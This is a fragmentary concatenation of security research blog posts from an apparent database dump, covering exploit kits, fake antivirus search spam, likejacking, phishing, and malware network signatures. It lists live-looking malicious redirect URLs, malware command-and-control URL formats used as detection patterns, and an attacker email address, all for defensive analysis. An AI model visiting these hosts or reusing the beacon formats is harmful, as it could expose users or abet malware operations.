are online casinos and gambling affiliates -- looking more closely at the website paths visited related to gambling within this period determined that this anomaly was caused due to the ICC Cricket World Cup in which many of our Australian and Indian customers were following the games.Chances are that traffic from your enterprise participated in one or more of these events during this Q1.', 'Analysis', 'https://www.zscaler.com/blogs/research/super-bowl-and-march-madness-enterprise');

Malzilla cannot manipulate the DOM like a real web browser, so I needed to copy and past the HTML-encoded data into a JavaScript variable. I then changed the JavaScript loop slightly, to extract the data from the variable instead of the HTML. Instead of doing an eval() of the code, I replaced the last line with document.write(c) to output the result.The code below was delivered by Malzilla following the aforementioned adjustments (I\'ve cut out the encoding data):Modified code to run in MalzillaI can now execute the script. The obfuscation requires many passes to fully decode the data andit takes quite a while to complete.Script executed by MalzillaNow, let\'s examine the output from Malzilla. The first part addresses a \"Please wait page is loading...\" message, very typical of the Blackhole Exploit kit so that the victim remains patient while the exploit code executes.Then, the JavaScript figures out which browser is visiting the page, what plugins are installed and with which version. This is subsequently to decide which exploit payloads to deliver.Browser fingerprintingDepending on what browser information was obtained, different exploits can be delivered. It could for example be a malicious Java applet:Launch a malicious Java applet... or a remote code execution targeting a known Internet Explorer vulnerability:MDAC exploit for Internet Explorer.. or a malicious PDF file:Malicious external PDF file... or a malicious Flash file:Malicious Flash fileSeparating the exploit into an encoded payload and a decoding loop made it easier for the exploit kit creators to create an infinite array of different pages in order to evade detection.

Zulu is a completely free service, open to anyone, which allows people to determine the risk posed by a particular web resource.Zulu Launch BannerOur goal in building Zulu, was to provide a simple and straightforward interface accessible to anyone regardless of security knowledge, while still delivering granular results that are of value to those that are more security savvy. I believe we\'ve achieved this by providing a UI that requires no additional input beyond the UI to be analyzed, while allowing a few necessary advanced options, (User-Agent and Referer) when encountering malware triggered only when certain input variables are met. Results also display an overall ranking of Benign, Suspicious or Malicious, but also include details of elements that went into the overall score.Zulu User InterfaceWe were also determined not to deliver a \'me too\' project as there are already a number of great security projects available. Services like VirusTotal, Anubis and Wepawet for example, are invaluable tools when running specific tests (multi-AV, JavaScript/PDF analysis and sandboxing respectively). However, most projects such as these tend to focus on a specific threat or type of analysis. With Zulu, we sought to combine our own proprietary scanning techniques, with the great open source intel. that is available, to provide a broad view of the overall risk posed by virtually any web resource. We also look not just at a specific aspect of the resource, but instead, separately focus on determining risk for the content, URL and host separately, which is then combined into an overall risk score. For each component, we employ the following approaches:Zulu results for Zeus Related MalwareContent – Page content is scoured for the inclusion of potentially malicious code leveraging proprietary Zscaler algorithms, conducting heuristic tests and querying public sources.URL – The requested URL is tested against known suspicious/malicious patterns, public black/white lists, as well as historic risk assessments for subdomains, domain TLDs, file types, etc.Host – Historic reputations of the host IP address, Anonymous System Number (ASN) and geographic location are analyzed, along with suspicious behaviors displayed by the host in question.A unique benefit of this approach is that we can deliver a risk score even when the page content is no longer available. While we can\'t access the page, we can still assess the URL and host and when they deliver a high risk score despite a lack of page content, one can often conclude the page was indeed malicious but has since been taken down. We also provide full access to historical scan results for the same resource. This can often uncover when a page first became infected and when it was subsequently cleaned up.Why would Zscaler, a commercial entity, release a free tool? I\'m sure that companies release free tools for a variety of reasons and ours are quite straightforward. Obviously Zulu provides a marketing benefit, but beyond this, it permits ThreatLabZ great freedom to experiment with new detection techniques. We plan to use Zulu as a proving ground for our great ideas (and yes, that makes you our guinea pigs). The benefit to you is that you\'re able to leverage some of our latest and greatest techniques. Moreover, you may well analyze a malicious web site that we haven\'t seen before. In the end, we hope that you find Zulu to be a valuable tool to combat web based threats and we certainly welcome your feedback at zulu[at]zscaler[dot]com.One last thing. Why Zulu? Well, the Zulu warrior was a formidable foe, but more importantly, Zulu warriors represented a citizens army. Not a standing army, but one that came together and fought valiantly when faced with an impending threat to their society.

Attackers continue to use these exploit kits to generate malicious webpages and host them on various domains. These exploit kits usually targets browser and browser plugin vulnerabilities.\r\n\r\nTo increase the likelihood of a successful attack, exploit kits are commonly used to infect legitimate sites that already have significant traffic. Attackers achieve this by crafting scripts designed to identify sites with injection vulnerabilities, which allow for hidden iFrames to be written, which then point to the exploit kit URL. When users visit the infected sites and are redirected to the browser exploit kits, a known browser or plugin vulnerability is typically used to download and execute malicious content without user knowledge. You can visit this related blog for more information about iFrame injection in detail.\r\n\r\n \r\n\r\nRecently, I’ve seen a spike in such compromised sites, which lead to exploit kit URLs.

Generally, the visibility of the iFrame is kept hidden and dimensions are kept to a minimum, which ensures that the iFrames don’t alter the look and feel of the page.\r\n\r\nExploit kit URL: hxxp://racingengines.osa.pl/showthread.php?t=63942072\r\n\r\nAfter observing patterns in the exploit URL, one can determine that this URL belongs to the Incognito Exploit kit.\r\n\r\nSuspicious URL Pattern: “/showthread.php?t=”\r\n\r\nSearch results for the above pattern at www.malwaresomainlist.com confirms that URL belongs to the well known Incognito exploit kit.

A time when we set aside our quarrels and show compassion for complete strangers, realize that it’s better to give than to receive and in the security industry, let everyone know just how smart we are playing Nostradamus. Yes, it wouldn’t be December if I didn’t join in the chorus of prognosticators to let you know exactly what is in store for us all in the coming twelve months. Mobile With WebOS now officially an orphan, Blackberry OS racing to the grave and Windows Mobile still trying to get ready for the party, the victors can be crowned – iOS and Andorid have won. The interesting part of the race is about to begin, namely who has the best security model. Will it be Apple’s draconian, ‘we control everything’ or Google’s happy-go-lucky ‘come on in, everyone’s invited’ approach?Prediction: The ‘do no evil’ company will struggle mightily to keep evil applications out of their App Marketplace. In an effort to avoid being to mobile what Windows is to PCs (a breeding ground for malware), Google will subtly make Android less open to both partners and developers. They will also announce an initiative to increase security screening for applications before deployment in the App Marketplace. Apple on the other hand will have comparatively few malicious apps to deal with, but at least three major OS flaws that impact all users (and make the jailbreak team happy). Apple will address the vulnerabilities several days late and apologize to no one. iPad 3 and iPhone 5 sales will turn financial analysts into giddy schoolgirls. EnterpriseThanks to marketing teams across the globe, APT (Advanced Persistent Threat) has become a meaningless buzzword in the security lexicon. Let’s therefore ditch that term and instead focus on targeted attacks, specifically those focused on enterprises with the goal of corporate espionage or to inflict financial damage. Many praised Google for coming forward in January 2010 to reveal that they and others had been the victim of a sophisticated targeted attack, likely originating from China. Many in the public mistakenly assumed that this was a new and previously unseen event on the security stage. What was new about it was the openness displayed by Google in discussing the situation, not the class of attack. Prediction: The term ‘APT’ will go the way of ‘eCommerce’ and the Dodo bird, but stories of targeted attacks against enterprises will rise tenfold in the media. This will be a reflection of increased activity by attackers as they broaden their reach to smaller companies and decisions by corporate council to disclose details of an attack rather than to suppress the information and risk litigation for trying to cover up such activity. WebWant to know a secret for making security predictions? Take a look at what was being discussed at security conferences 2-3 years ago. At Black Hat DC 2009, I discussed the dangers of persistent web browser storage. One of the key technologies that will be taking browser storage to the next level is HTML5. In 2009, HTML5 apps were few and far between. Thanks in large part to mobile browsers; HTML5 is now much more mainstream. As with any new technology, developers are quickly rushing to play with the new kid on the block and publishing their goods, without taking the time to understand the security implications.Prediction: We’ll see an increasing number of web application vulnerabilities in HTML5 apps, not because the technologies behind them are insecure, but because HTML5 is not well understood from a security perspective. HardwareSecurity in the hardware space is at least ten years behind security in the software industry. This isn’t so much a reflection of the good work being done in software, as it is the reality of software vendors being forced to address an issue that was impacting business. Thanks to the efforts of many great researchers investing countless hours doing QA work that should have been done long before products hit the shelf, today most major security vendors have no choice but to employ security response teams and take vulnerability disclosure very seriously.Hardware vendors simply haven’t faced the same scrutiny, but that’s changing. This year at Blackhat, I spoke about the sad state of embedded web servers and recently researchers at Columbia University discussed the ability to remotely cause physical damage to HP printers due to security flaws.Prediction: Hardware vendors will get a wake-up call as researchers shift their efforts and party like it’s 1999. SocialThe majority of malicious activity surrounding social networks today primarily involves unwanted or nuisance traffic as opposed to attacks that lead to a fully compromised machine. We’re seeing an increase in likejackingand self-inflicted JavaScript injection attacks that have the same overall goal – drive web traffic or prompt software downloads that can earn the scammer a few cents per click. Social networks such as Facebook are of value to more serious criminals, but mainly for reconnaissance during targeted attacks. They are a great resource for learning background information about an individual and uncovering relationships, all of which can be of great value for social engineering. We’re not however, commonly seeing the communication aspects of social networks used to deliver malicious payloads directly to victims or investments in uncovering web application vulnerabilities used to compromise end user machines as opposed to spreading the aforementioned scams.Prediction: Attackers will raise the bar and leverage social networks for more sophisticated attacks, the goal of which will be full compromise as opposed to marketing financial scams.Merry New Year!- michael', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/2012-security-predictions');

More than 90% of search results for \"buy Microsoft Windows\" and similar searches, lead to fake stores on major search engines. Not much has been done by the search engines to clean up these search results.    Since the beginning of 2011, the number of search results for popular queries leading to fake AV pages and malware has dramatically decreased, especially on Google.    I\'ve wondered when attackers would switch from the poisoning popular search phrases, to more targeted searches. In the past few weeks, I\'ve seen more and more spam redirected to malware, where similar searches would previously have led to a fake online store.    For example, the website www.saloncti.com contains multiple spam pages around \"buy microsoft office\" (be careful if you decide to follow the search results). These spam pages are very similar to the spam pages leading to fake stores.       	  		  			  		  		  			Spam page on http://www.saloncti.com/?p=1523  		  	    Instead of a fake store, the visitor is redirected to at least three types of malware.

Although the page looks visually the same as the Fake AV pages I\'ve seen so far, the source code is very different.    Here is a video of the Fake AV page. I quickly got blacklisted (see details below in the post), so I had to reconstruct the page on my local machine. On the real website, I would have been prompted to download an executable, which was malware disguised as an antivirus solution.             Naked Emma Watson video    I\'ve described this malicious page in a previous blog post. Basically, the page looks like YouTube, with a purported video of Emma Waston naked.

The page shows a picture of a scantily clad Paris Hilton. Again, the goal is to trick users into installing malware disguised as a Flash update.           The page was hosted on firstuzsoft.rr.nu and was not blocked by Google Safe Browsing.

Here is a sample of a redirection from a Yahoo! search, to the malicious domain:       	http://search.yahoo.com/ra/click?.bcrumb=tfNYWE9Y1t1&p=site%3Asaloncti.com%20software&cq=[...]  	http://www.saloncti.com/?p=1870 (302 redirection)  	http://74.63.193.178/tra1/change.php?sid=8 (302 redirection)  	http://74.63.193.178/tra1/got.php?sid=8 (302 redirection)  	http://www.communitysupportottawa.ca/cutenews/ip.php (302 redirection)  	http://www.skibec.ca/castor-kanik/cutenews/ss/2.php (302 redirection)  	 http://www3.bestiiarmy.rr.nu/?nlqqufcc=kuHa1bKbmpOZi%2BPdzaaUmNnsq56lopva18%2Bfl6Sqnp%2BU1Z3cntKV    After following a couple of search results, my IP address got blacklisted and I was redirected to ask.com instead of the malicious domain.

For example, the \"like\" button may be hidden behind an image such as a picture of an embedded YouTube video with a play button. Zscaler released a free browser plugin for identifying and warning of hidden \"like\" buttons in webpages. However, a recent campaign on Facebook in which inappropriate pictures (porn, mutilation, etc.) were spread through user\'s social networks was conducted via a different mechanism that many are unfamiliar with: self-inflicted JavaScript (JS) injection. This post will explain the basic technique and some of what we are seeing on Facebook.         Many people are unaware that they can run JS directly from their browser\'s URL bar. Go ahead and try it. Here is a benign script that pops up a test alert in your browser, enter this into your URL bar: javascript:alert(\'test\');              If you\'re running NoScript it prevents running JS directly from your URL bar to combat social engineering attempts to get users to unknowingly run something malicious, and will provide the following dialog message:          Otherwise, here is a screenshot from entering this in Safari:    In this example on Safari, I was initially on the www.apple.com page before I launched the JS in my URL bar - so you can see the Apple page in the background and the JS alert message appears to have come from www.apple.com. This would change depending on whatever page I was on when I launched the JS in the URL bar - additionally the JS could be modified to interact with or modify content on the current page. In other words, you could run JS that could completely modify the Apple page locally in your browser or interact with buttons or links. This is an important concept to understand and is a technique that is being used to do damage to Facebook accounts / profiles.         The \"same origin policy\" is a security concept used in JS and other browser-side scripting languages that prevents scripts from one website from accessing methods/properties on another website. So when you visit your friend\'s blog, he is unable to have JS execute and automatically interact with your Facebook account. Instead he includes a link at the bottom of his blog to interact with facebook.com and pass a parameter to Facebook saying that you \"like\" his post (the \"like\" button). For example,           www.facebook.com/plugins/like.php?href=HIS_BLOGPAGE&width=120&height=22&layout=button_count&show_faces=false&action=like&colorscheme=light           There is an exception to the \"same origin policy\" in which you can execute script locally within your browser to interact with a page (shown above in the apple.com example). Developers and browser plugins (e.g., greasemonkey) take advantage of this fact to alter various aspects about a webpage. Bad guys are also taking advantage of this fact, by social engineering users to copy/paste or type JS in their URL bar to perform unwanted actions. While logged into Facebook, the JS can automatically perform actions in your account such as, \"liking\" content or messaging your friends.         Facebook has cleaned up most of the offensive content from in the recent campaign.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (343, 'Analyzing Malicious Files For Writing Network Signatures', 'ThreatLabz', 'November 10, 2011', 'Attackers continually modify malware in order to evade antivirus software. Attackers will pack or encrypt malicious files using various packers. Blocking each and every malicious executable is a challenging task for antivirus vendors. Most malicious files, once installed, try to download additional malware or send HTTP GET/POST requests to malicious servers controlled by attackers. Malicious files can gather sensitive information and then send it to the controlled servers. Given the networking capabilities of malware, beyond simply trying to identify the malicious binary itself, we can also detect malware by identifying certain patterns in network traffic. This blog will explain how someone with limited reverse engineering skills can monitor network traffic to identify malicious binaries.      For this tutorial, we will use the example of a real-world malicious server - “hxxp://uaetoon.net/scan/”. This website hosted a fake antivirus program, designed to convince a victim that their PC was infected. The site displayed different security alerts, such as “Your Computer is Infected”. Here is the screenshot of the malicious website once visited,    The website would then convince the victim to download a malicious binary file called “setup.exe” in order to remove fake threats found on the system. Installing the binary was of course actually installing a Trojan on the machine as opposed to an AV solution. The malicious binary would then send various HTTP requests to malicious servers controlled by the attackers. We can study the network traffic by allowing the binary to execute in a virtual machine, but this approach has some limitations:      	You need a separate controlled environment to run the malicious samples. It is never advisable to run the samples on your production network.  	There are chances that not all HTTP requests are fired by the malicious binary depending upon the availability of malicious severs.    Due to the above limitations, we sometimes need to first reverse the malicious binary in order to retrieve strings such as the destination servers. This can easily be done, with limited reverse engineering knowledge and without running the sample. Let’s begin with some static analysis. Download the malicious file on your machine or VMware image, but don’t run it.    Let’s first find out if the file has been packed using some well-known packer. To do so, you will need to open the malicious file in a hex or text editor. Here is the screenshot of file when opened in a text editor:  Here, a little knowledge of commonly used packers will be helpful. UPX (Ultimate Packer for Executables) is often used by attackers, as it is a free and open source packer. You will generally find strings like “UPX” and “UPX1” in the malicious file in plain text if the file is packed using UPX. Now that we know the file has been packed by UPX, we need to unpack it and open it in the IDA pro dissembler. To unpack the malicious file, download UPX packer. Unzip the packer and copy the malicious file into the UPX folder. Unpack the malicious file with the simple command shown in below screenshot,  Now, the file has been unpacked and can be opened in IDA pro. We are not going to fully reverse engineer the file for the purpose of this blog, rather we’ll look for potential domains where traffic is sent. In the next screenshot, you can see the binary in IDA Pro:    Allow IDA Pro to complete its analysis and then open the “Strings window” to identify strings used by the file. Going through the strings window, you will learn a great deal about the activities conducted by this binary, such as registry changes or network traffic sent. Let’s look at some interesting strings:  From the above strings, we can conclude that this malicious binary creates registry entries under “Run” in order to run this executable each time the computer is rebooted. This binary can also send HTTP POST requests with content type x-www-form-urlencoded, which refers to the URL format. This is valuable information when writing pattern matching signatures, in order to block further infection. Copy and save the URL format which is “http://%s%s?act%sor&v=1&a=%d&id=%s&hardid=%s”. The malicious file later will substitute domain strings and other data in place of the %s (string) variables.    Here is another set of strings:    We now have all the malicious domains, along with another URL pattern. That’s it! We now have all the domains and URL patterns necessary to write network-based signatures. While this approach won’t work in every case, it does represent an efficient way to write network signatures without the need to conduct a full and time consuming reverse engineering exercise. Now we have 2 URL patterns:      	http://%s%s?act%sor&v=1&a=%d&id=%s&hardid=%s  	%s?action=%sgen&v=%s    We can now easily block all HTTP requests, including the above patterns. Even if the attacker changes the domains used, chances are high that the URL format will remain the same. It turns out that this traffic relates to the now well-known Koobface worm.    Blocking all variants of malware can be difficult but we can greatly improve detection rates by additionally monitoring network traffic.    Hope this will be useful.

Let’s take look at the phishing page for SCB:        You can observe areas marked in the picture above, which differentiate it from the legitimate SCB website. When a victim enters a username and password, the phishing webpage sends these credentials to a webserver controlled by the attacker.    Let’s enter fake credentials and see how these are sent to the cyber-criminals.             Legitimate sites use SSL encryption to secure sensitive information entered by the users, while this phishing site sends the data in clear text, presumably because the attackers were too cheap to pay for a signed SSL certificate.    Lets take a look at the legitimate webpage of SCB and observe the same marked areas:        We have observed numerous similar phishing pages. Recently, Umesh blogged about a phishing scam targeting Gmail users.

Once a victim visits this website, he will be presented with popup box portraying the site as AOL’s billing center:  The message indicates that the user needs to update credit card and billing information, or their account will be ‘voided and cancelled’. When victim clicks on the OK button, he will be taken to another webpage where he is asked to enter his credit card details.  Once the victim enters their sensitive and personal information, the webpage smartly displays another popup stating “AOLBilling will now validate your credit card”. This is again done to convince user that the site is a legitimate AOL billing website. Nothing is actually validated against AOL and credit card information is sent to attacker. The webpage collects and sends a POST request with all user details. Here is packet capture of the request sent:    For the purpose of this blog, we have entered fake information. If you look at the above POST request, you will also notice a recipient email address of “maximatm@yahoo.com”. This means all sensitive information is sent to this email address. The victim is then redirected to the error page.    Users should never enter credit card details without being 100% confident that the form is hosted at the correct domain and traffic is sent via HTTPS.

It is technically much more complex than the previous one, Zscaler Safe Shopping.    Each browser offered different challenges. As promised in the previous blog post, I will provide details of what was required to port the plugin to different platforms.    Facebook Likejacking Prevention 1.0.8    Before I start on the technical details, I\'d like to remind all users to upgrade to the latest version of the add-on (currently 1.0.8). In Firefox and Chrome, go to Add-ons or Extensions, and check for updates. For Safari users, please install the latest version from our website. I have fixed a couple of bugs, and made several improvements in the detection of suspicious pages.    This is a fairly long and technical post. Don\'t hesitate to post a comment if some points are not clear.    The Architecture    There are two main components in the plugin. The first feature involves finding  the Facebook widgets inside a page. These widgets are iframes hosted on www.facebook.com. Then the plugin needs to inspect the containers, the HTML elements that contain the IFRAME, to figure out if the widget is hidden or not. The protection (widget removal or explicit confirmation) needs to be applied on each widget, as chosen by the user.    The second element involves displaying relevant information to the user: a quick view indicating whether the page is suspicious or not and a more detailed view for additional information.    Google Chrome    Extensions on Google Chrome are comprised of two parts:    	A background page which has access to the browser: local storage, extension options, tab events, etc., but it does not have access to the content of the tabs, i.e the HTML content  	A content script injected in each page/frame/iframe, which has access to the HTML content (read and write), but does not have access to the browser or other tabs. The content script injected in one frame does not have access to other frames or iframes, even within the same tab.    The background page and the content scripts can communicate with each other by sending messages.    In Zscaler Likejacking Prevention, the content scripts are charged with finding the Facebook widgets, inspecting the containers, and sending the information back to the background page. The background page aggregates  the information for each tab, and decides which action to take on the tab content depending upon the options and whether or not suspicious elements where found.    This architecture works well for the add-on, except in these two scenarios:    Layers of Frames/Iframes    Facebook widgets can be loaded inside an iframe or a frame, which can itself be loaded inside an iframe, etc. In order to inspect the container, the content script would have to cross the boundaries of the frame/iframe it was injected in. But this is not allowed by the browser. So doing the DOM inspection for the container from bottom (the Facebook widget) to top (the main document) by each injected script is not possible.    Instead, container inspection has to be done with a mix of bottom up and top down. The content script in the main document does have read access to all the frames/iframes which it resides in. After all Facebook iframes are found, the container inspection is done from the widget to its containing iframe (bottom up).    The parent container is found with the parentNode property of a DOM element in Javascript. Unfortunately, the parentNode of an iframe is shown as null.  In order to find the container of an iframe, it has to be found from the top document down to the iframe based on it\'s SRC attribute. Finally, a new score is computed by the main document and sent back to the background page. If an action needs to be taken, the background page sends a message to all injected scripts inside the tabs.    Late loading    The page is inspected as soon as it is loaded, in order to apply the protection quickly. However, Facebook widgets can be inserted at any time, including after a page has finished loading. So the page score must be recalculated every time a new iframe is loaded.    To solve the problem, when the background page gets a message from an injected script inside a Facebook iframe, it checks if any Facebook widgets were already found in this tab. If not, the background page asks for a new evaluation of the page.    Icon and Popup    Chrome has the best architecture for showing information for a specific page. It was very easy to show an icon associated with a popup for a given tab. No problem there.    Safari    Safari (Opera and Firefox Mobile as well)  has the same plug-in architecture as Google Chrome, with the separation between the background page (referred as global page by Safari) and content script. Therefore, it did offer the same challenges as Chrome.    However, some technical limitations in Safari did bring a few more issues...    One way communication    While each injected script can send a message to the global page, the global page can only send a message to the main page, not to each frame/iframe. To be more specific, the global page can reply back to a message from a frame/iframe, but cannot initiate the message to them. That means once it has aggregated the information from all content scripts, it can push a message to apply the protection to the main page only. To get around this limitation, each frame/iframe has to send a message to the global page regularly to check if there is any action to be taken.    Storing the aggregate information    In Chrome, each tab has a unique ID. The aggregate information is associated with the tab ID. There is no such ID in Safari. Instead, the information can be saved as a property of the tab. Unfortunately, if the tab is moved to a new window by the user, the associated property is reset, and the information is lost. I have to save the information as a tab property (the most accurate way), but also based on the URL in case the tab is moved. If there are different tabs with the same URL, but different content, the data can be mixed up.    Limited UI    I had to find a creative way to get around the UI limitations of Safari. First of all, it is not possible to have an icon in the URL bar as I do in Chrome and Firefox. Then, toolbar buttons are black and white only, and can have only 2 states. I need 3 states for the button: no Facebook widgets on the page, safe page with Facebook widgets and suspicious page.    Instead of an icon or button, I had to use a toolbar. I also had to take care when it came to hiding and showing the toolbar when the user switched tabs, loaded a new URL, etc.    I actually had to use two toolbars, because each is limited to a fixed height of 30 pixels. One toolbar is not enough for all the information and links I want to show. The detailed information and actions have to be shown on a second toolbar!    Firefox    Firefox has a centralized plugin architecture: the browser and all the tabs, including their content with read and write permissions are available from the same JavaScript file. That made it much easier to inspect DOM elements with several layers of frames/iframes.    However, it was harder to detect new frames/iframes being loaded or added by just listening to page load events. The solution I use is to listen to HTTP requests for HTML documents and re-inspect the tab every time a new element was sent.    UI    The UI was a bit more tricky than in Google Chrome. There are icons associated with a popup called Page action. Unfortunately, the popup content is limited to a piece of text and one button. This does not work with the information and actions I needed to offer.    Instead, I had to create my own \"Page Action\" by adding and removing an icon in the URL bar as needed and showing a toolbar at the top of the tab when the user clicks on the icon for more information. Overall, it required a bit more work than Google Chrome, but was much easier than for Safari    Conclusion    It was interesting to see the impact of the different browser architectures and limitations on my plugin. Safari was by far the hardest platform to work with. DOM inspection and manipulation was the easiest in Firefox, while displaying information in the UI was best done in Google Chrome.    It is a bit disappointing that it was not possible to have the plugin look the same in the different browsers. Google has the layout I really wanted and I found the UI restrictions in Safari very problematic.    -- Julien', 'Tools', 'https://www.zscaler.com/blogs/research/building-zscaler-likejacking-prevention-different-browsers');

Typically, the scammer creates a page with a fake video player. Users are tricked into clicking on Facebook Like buttons hidden behind a fake Play button. This is called Likejacking, and it\'s a specific form of clickjacking. I have posted a Youtube video showing in June that explains how these Facebook widgets are disguised.    I previously posted a bookmarket - a piece of JavaScript that can be executed on any page to display hidden Facebook widgets on the page. I wanted to go a step further and offer good protection against Likejacking, or any type of clickjacking with Facebook widgets (Facebook comments, Facebook login, etc.).    You can install the free Zscaler Likejacking Prevention tool for Firefox, Google Chrome and Safari. The extension offer 2 primary features:    	Information about the page: does it contain Facebook widgets? Are these widgets hidden?  	Protection against hidden widgets: the application requires explicit confirmation from the user when clicking on a Facebook widgets on a suspicious page             Page information    On Firefox and Chrome, an icon is displayed in the URL bar when a page contains at least one Facebook widget. If the page is suspicious, meaning hidden widgets were detected, the icon has a red background. You can use https://www.zscaler.com/research/plugins/likejacking/example.htm as an example of a suspicious page.       	  		  			  		  		  			Suspicious page found in Firefox  		  	    If the page is safe, meaning the widgets are not hidden, the icon background is green. This allows users to have a quick understanding of the safety of the page.       	  		  			  		  		  			Safe page found in Chrome  		  	    Safari has the same functionality, but uses a toolbar instead of an icon.       	  		  			  		  		  			Suspicious page found in Safari  		  	      You can obtain more information on the page -- either by clicking on the icon, or \"More options\" in Safari -- including:    	how many widgets were found on the page  	whether the page is suspicious or not  	what protection was applied on the Facebook widgets           	  		  			  		  		  			Information, and actions, for a page with Facebook widgets (Chrome)  		  	    The popup (Chrome), or toolbar (Safari and Firefox) also let users take some action on the page: they can whitelist the current domain (see more below), manage their preferences, or display the hidden Facebook widgets on the page.    You can also report back to Zscaler, any page that was classified improperly by clicking on \"Report an error\". This will open a new tab in your browser and  send you to a form on the zscaler.com website. We will use this information to improve the add-on.    Display hidden widgets    As you can see in the Youtube video, it is possible to expose the hidden widgets. The extension can modify the source of the page (opacity, height, weight, z-index, overflow, etc.). You can try this feature on https://www.zscaler.com/research/plugins/likejacking/example.htm.       	  		  			  		  		  			Hidden Like buttons exposed in Firefox  		  	    Explicit confirmation    You can choose your level of protection in the preferences:    	Delete all Facebook widgets - Choose this option if you never use \"Like\" buttons on external sites. You can always whitelist a domain to keep the widgets on a particular site.  	Always ask for explicit confirmation - A popup will warn you that you clicked on an element that is trying to post to your public profile. You can decide to stop the action, or to let the page post to your profile. This is a good option if your rarely click on \"Like\" buttons.  	Ask for explicit confirmation only on suspicious pages with hidden widgets - This is a good balance between security and productivity. It is the recommended setting.        	  		  			  		  		  			Explicit confirmation in Safari  		  	    You can also whitelist domains so that no protections are applied on a given site. The popup, or toolbar, can show you what action was taken on a page -- for example confirm, remove, or ignore (no protection applied).       	  		  			  		  		  			Extension preferences in Chrome  		  	      Some notes    The extension does not affect the ability to use the main Facebook site; it protects users only on other sites that use widgets from Facebook.    Some Facebook widgets are hidden by design. This is normal, and the the extension will not list them as suspicious and will not apply any protection on those.    I will post another blog on the process of creating the plugin for different browsers to explain the challenges I faced on each platform.    -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/protect-your-self-against-facebook-spam-zscaler-tool-likejacking-protection');

Recently, we came across yet another interesting scam, this one offering a free official t-shirt as a gift on the occasion of Facebook’s 7th birthday celebration. At first, this scam looked like any other, but after further analysis I realized that this scam takes advantage of mobile email uploads. Facebook provides user’s with a unique email address as a convenient means of uploading content from mobile devices. Here is what the scam message looks like:        If you click on the link, you will be taken to a page offering the fake free t-shirts, as can be seen in the following screenshot:        The page provides a button to click for redeeming the t-shirt and also displays a counter showing how many additional shirts remain in stock. If you navigate the ‘Click Here’ button, you will be taken to the following page, which can be seen below:        Take a look at the instructions mentioned on the page.

Mobile Upload:    When logged into Facebook, the email address displayed at www.facebook.com/mobile is a unique email address that a user can leverage to post status updates or send photos and videos straight to their profile.

The Facebook mobile page displaying directions for using the unique email address can be seen below:        This is yet another trick used by scammers to gain access to your profile. Once a victim copies/pastes that email address, they will be taken to the page where the scam site will then ask them to complete surveys such as the one shown below:        The surveys represent the monetary component of the scam as the attackers are rewarded with a few cents every time a survey is completed. This is a common technique used in Facebook scams. The interesting component of this attack remains the social engineering used to obtain a victim’s personal email address, for uploading content from a mobile device. Once an attacker has that address, they have full write access to a victim’s profile and can use it to further propagate scams for monetary gain.    The cat and mouse game between Facebook and scammers continues. This time around, cleanup isn’t as simple as deleting a post from the victim’s profile.

The main branch is still incompatible with Firefox 6, but the latest Firesheep branch, (firefox5) remains very active and contributors are working toward making Firesheep compatible with newer versions of Firefox. I was able to compile this branch on Linux, but not on on Windows 7. Unfortunately, there were actually several changes in Firefox 4 that are incompatible with the original architecture and implementation of Firesheep.    New Add-on Manager    Firesheep calls the executable component firesheep-backend.exe (or firesheep-backend depending on the platform) which is packed with the add-on. To find the path of the executable, Firesheep needs to get information about the add-on through the add-on manager.    Firefox 4 introduced a new way to interact with the add-on manager and deprecated the previous one. The change is deeper than just calling a different function. Getting the path of the add-on now requires an asynchronous call instead of a synchronous function call. This can be a big change for most plugin architectures. Fortunately, Firesheep is very well structured and uses an event-driven architecture. This means that it can easily deal with asynchronous calls.    The Firesheep branch firefox4 fixes this issue (mostly in modules/Firesheep.js) in a way that is backward compatible with Firefox 3.6.    C++ XPCOM    While running firesheep-backend.exe, Firesheep needs to capture the output of the program. Natively, Firefox allows add-ons to run executables, but not to capture the output. Firesheep worked around this limitation by creating a custom XPCOM element in C++ that allows it to run executables and capture their output. In brief, XPCOM elements are cross-platform components that can be written in C++ and other languages. These components can interact with the platform (Windows, Linux, Mac OS X) and can be called through JavaScript inside the add-on.    There are several radical changes in Firefox 4.0 regarding XPCOM. First of all, you can see in the Firesheep compilation instructions, that the add-on must be compiled against Gecko 1.9.2. But Firefox 4 uses Gecko 2. This is a major version change which is not compatible with Gecko 1.9.2.    Among the changes required with Gecko 2 regarding custom XPCOM elements, the following are a problem for Firesheep:    	XPCOM elements must expose a new interface, so older XPCOM elements for Gecko 1.9.2 no longer work  	XPCOM elements must be recompiled for every new major release of Firefox. This is a maintenance headache with the new Firefox release scheme, where major versions are released every few months    This led Firesheep to change its back-end considerably. You can see these changes in the firefox5 branch. Firesheep dropped the custom XPCOM. It now uses the native Firefox objects to run the executable. The back-end writes its output directly to a temporary file and Firesheep tails the output.    As a result, the implementation of Firesheep is a bit more complex, but getting it to run on different platforms is easier. The new version of Firefox is compatible with OS X 64bit, which was not previously the case. It should also make it easier for Firesheep to work with newer versions of Firefox, because there is no longer a dependency on a custom XPCOM.    No binary release yet    Unfortunately, there is no binary release (the final XPI add-on) of the firefox5 branch available for users to download and install on Firefox. While I was able to compile it on Linux (32bit and 64bit) easily, I could not compile it on Windows (missing pcap-config, could not find my BOOST libraries, etc.). I\'ve spent several days trying to compile the different branches on Windows without any success.    BlackSheep    Because BlackSheep is largely based on the Firesheep source code, it suffers the exact same problem. I did not test BlackSheep thoroughly enough after Firefox 4 was released, so I did not realize BlackSheep no longer worked. I apologize to the users of BlackSheep.    I want to make BlackSheep available for Firefox 4 to 6. This should be possible by using the firefox5 branch of Firesheep, but I need to successfully compile this branch on Windows 7 first, which I have not been able to do despite my best efforts. I would be very grateful if a reader has a working Firesheep firefox5 version for Windows and could send it to me. I\'ll then be able to update BlackSheep and release it to the public.    -- Julien', 'Encryption', 'https://www.zscaler.com/blogs/research/firesheep-and-blacksheep-firefox-40');

